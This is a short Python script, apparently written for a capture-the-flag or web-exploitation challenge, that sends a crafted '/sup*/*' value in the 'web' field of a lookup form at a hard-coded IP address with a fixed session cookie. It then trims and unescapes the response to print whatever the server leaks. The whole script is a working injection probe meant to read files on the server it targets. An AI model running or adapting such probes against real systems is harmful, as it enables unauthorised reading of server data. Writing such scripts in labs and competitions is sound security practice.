import requests
import html

URL = "http://101.50.0.66:7787/lookup"
COOKIES = {'session': '.eJyrVoovSC3KTcxLzStRsiopKk3VUcrJT09PTcnMg_FLi1OL8hJzUxNTckGCShC6FgCKuBVz.YuYPOA.lp_LvMGFZYUyo_TXaa26UeAWm_g'}


payload = '''/sup*/*'''
r = requests.post(URL, cookies=COOKIES, data={'web': payload}, 
                  #proxies={'http': 'http://127.0.0.1:8080'}
                  )
r = r.text[3134::]
r = r[:-100]
r = html.unescape(r)
print(r)